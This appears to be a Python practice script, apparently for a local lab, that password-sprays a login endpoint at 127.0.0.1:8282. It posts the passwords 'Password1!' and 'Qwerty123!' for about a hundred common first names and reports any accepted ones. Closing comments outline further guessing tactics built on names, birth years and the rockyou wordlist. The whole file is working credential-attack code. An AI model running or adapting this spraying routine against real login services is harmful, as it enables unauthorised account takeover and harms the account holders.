import requests
# create a simple server in js to display the request
userfile = ["michael","john","david","chris","mike","james","mark","jason","robert","jessica","sarah","jennifer","paul","brian","kevin","daniel","ryan","matt","andrew","michelle","steve","lisa","alex","joe","amanda","ashley","scott","richard","eric","jeff","justin","karen","linda","mary","adam","melissa","matthew","nick","stephanie","anthony","tom","josh","laura","tim","jim","amy","peter","dan","nicole","tony","steven","susan","kelly","dave","brandon","maria","ben","kim","julie","sam","jonathan","rachel","joseph","christopher","william","heather","bill","katie","thomas","kyle","patrick","stephen","aaron","angela","elizabeth","sean","gary","emily","bob","samantha","greg","sara","jamie","sharon","george","joshua","anna","andy","nancy","donna","jeremy","debbie","christine","rebecca","kathy","jay","sandra","andrea","megan","lauren"]
# 2 most popular past words
# Password1!
# Qwerty123!
for user in userfile:
    r = requests.post('http://127.0.0.1:8282/login', data={'username': user, 'password': 'Password1!'})
    # sends request to server
    if r.status_code == requests.codes.ok:
        print("password guessed")
        print(user + ': Password1!')
    else:    #   if wrong try one more password else move to next user
        print("wrong password")
        print(user + ': Password1!\n')
        r2 = requests.post('http://127.0.0.1:8282/login', data={'username': user, 'password': 'Qwerty123!'})
        # sends request to server
        if r2.status_code == requests.codes.ok:
            print("password guessed")
            print(user + ': Qwerty123!')
        else:
            print("wrong password move onto next account")
            print(user + ': Qwerty123!\n')

    # viable strategy but not implementing since current strategy should be sufficient enough
        #   exactly 10 characters with accounts that has 9 letter names, guess their name capitalized with !
        # users with less than 9 character names filter rockyou with candidate passwords and guess those instead
        # birthday guess Steve2001! like this
            # for 5 character names 
        # Jessica99! guess between 90 - 10
            #for 7 character names

